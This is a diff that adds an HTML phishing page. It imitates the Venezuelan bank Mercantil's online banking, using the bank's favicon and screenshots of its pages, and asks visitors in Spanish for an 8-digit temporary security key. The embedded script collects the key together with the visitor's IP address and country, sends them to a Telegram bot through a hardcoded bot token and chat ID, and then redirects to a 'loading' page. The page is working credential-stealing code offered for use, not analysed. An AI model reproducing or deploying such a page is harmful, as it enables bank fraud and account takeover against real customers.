@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercantil en Línea</title>
+    <link rel="shortcut icon" href="https://www30.mercantilbanco.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="tk1.css">
+    <style>
+
+        .h1
+
+         *
+        /* Eliminar subrayado de los enlaces */
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        /* Opcional: Ajustar el estilo del texto dentro de los enlaces si es necesario */
+        .security-method a p {
+            margin: 0;
+        }
+
+        /* Estilo del pie de página */
+        .footer {
+            width: 100%;
+            text-align: center;
+            padding: 0;
+            background-color: #f1f1f1;
+        }
+
+        .footer img {
+            width: 100%;
+            height: auto;
+        }
+
+        /* Estilo del contenedor principal */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        /* Estilos para los métodos de seguridad */
+        .security-method {
+            display: inline-block;
+            margin: 20px;
+        }
+
+        .security-method img {
+            max-width: 100px;
+            height: auto;
+        }
+
+        .security-method p {
+            margin-top: 10px;
+        }
+
+        /* Media Queries para pantallas más pequeñas */
+        @media (max-width: 768px) {
+            .security-method {
+                display: block;
+                margin: 10px auto;
+            }
+
+            .security-method img {
+                max-width: 80px;
+            }
+
+            .footer-web {
+                display: none;
+            }
+
+            .footer-mobile {
+                display: block;
+                padding: 0;
+            }
+        }
+
+        @media (min-width: 769px) {
+            .footer-web {
+                display: block;
+            }
+
+            .footer-mobile {
+                display: none;
+            }
+        }
+
+        .security-method {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+
+        .input-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 20px auto;
+            width: 100%;
+            max-width: 300px; /* Ajusta el tamaño máximo del contenedor si es necesario */
+        }
+
+        .custom-input {
+            border: 2px solid #d2d3d3;
+            border-radius: 20px; /* Redondea los bordes del input */
+            padding: 9px 15px; /* Ajusta el padding para reducir el tamaño */
+            font-size: 19px; /* Ajusta el tamaño de la fuente */
+            margin-bottom: 10px;
+            outline: none;
+            width: 100%;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center; /* Centra el texto dentro del input */
+        }
+
+        .custom-input::placeholder {
+            color: gray;
+            opacity: 0.7;
+        }
+
+        .submit-button {
+            background-color: #004d9d;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 10px 68px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .submit-button:hover {
+            background-color: #0056b3;
+            transform: translateY(-2px);
+        }
+    </style>
+</head>
+<body>
+    <!-- Footer para versión web -->
+    <div class="footer footer-web">
+        <img src="https://i.postimg.cc/jq6pmb95/Captura-de-pantalla-2024-09-10-213742.png" alt="Footer Web">
+    </div>
+
+    <!-- Footer para versión móvil -->
+    <div class="footer footer-mobile">
+        <img src="https://i.postimg.cc/kgSZ9vHs/Captura-de-pantalla-2024-09-10-175316.png" alt="Footer Móvil">
+    </div>
+    <div class="container">
+        <!-- Sección de verificación de dispositivo -->
+        <h1>Ingresa la clave temporal</h1>
+        <img src="https://i.postimg.cc/13Lkcw7C/Captura-de-pantalla-2024-09-10-221820.png" alt="1" width="70" height="91">
+        <a >
+            <!-- Selección del método de seguridad -->
+            <p>Ingresa la clave temporal que hemos enviado.</p>
+        </a>
+    </div>
+    <div class="input-container">
+        <input 
+            type="text" 
+            id="customInput" 
+            class="custom-input"
+            name="tk1" 
+            placeholder="- - - - - - - -" 
+            required 
+            pattern="\d{8}" 
+            minlength="8" 
+            maxlength="8" 
+            title="Debe ingresar exactamente 8 dígitos numéricos" 
+            oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+        >
+        <br>
+        <button class="submit-button" onclick="sendMessage()">Continuar</button>
+    </div>
+
+    <script>
+        const botToken = '7444866518:AAGbS6e90_-hdarWTGVx9YCnYtfLEETJtbQ'; // Reemplaza con tu token de bot
+        const chatId = '-1002335794714'; // Reemplaza con tu chat ID
+    
+        async function sendMessage() {
+            const inputElement = document.getElementById('customInput');
+            const token = inputElement.value;
+    
+            if (token.length === 8) {
+                try {
+                    // Obtener IP del usuario
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip;
+    
+                    // Obtener información de ubicación basada en la IP
+                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const locationData = await locationResponse.json();
+                    const country = locationData.country_name || 'Desconocido';
+    
+                    const message = `
+    - - TOOK1 -:
+    🔑 *Token*: \`${token}\`
+    🌐 *IP*: \`${ip}\`
+    🏙 *País*: \`${country}\`
+    
+    `;
+    
+                    // Enviar el mensaje a través de la API de Telegram
+                    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+    
+                    const data = await telegramResponse.json();
+    
+                    if (data.ok) {
+                        window.location.href = 'load2.html'; // Redirige a success.html
+                    } else {
+                        console.error('Error al enviar el mensaje:', data);
+                    }
+                } catch (error) {
+                    console.error('Error al enviar el mensaje:', error);
+                }
+            } else {
+                alert('Por favor, ingrese exactamente 8 dígitos numéricos.');
+            }
+        }
+    </script>
+    
+</body>
+</html>
+
